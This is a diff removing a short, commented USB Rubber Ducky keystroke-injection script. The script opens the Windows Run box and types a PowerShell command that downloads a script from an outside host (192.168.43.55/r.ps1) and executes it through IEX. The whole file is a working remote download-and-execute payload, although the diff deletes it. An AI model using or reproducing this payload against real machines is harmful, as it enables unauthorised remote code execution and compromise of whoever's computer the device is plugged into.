@@ -1,9 +1,0 @@
-# below command is to wait for 1 sec which will give pc enough time to recognize ducky has keyboard
-DELAY 1000
-GUI r #windows + r to pull up run tab
-DELAY 100 # waits for 1 ms 
-
-# it types in below command in run tab with powershell, Net.WebClient object here allows us to 
-# download posted on that link  
-STRING powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.43.55/r.ps1');"
-ENTER # and hits enter to execute it
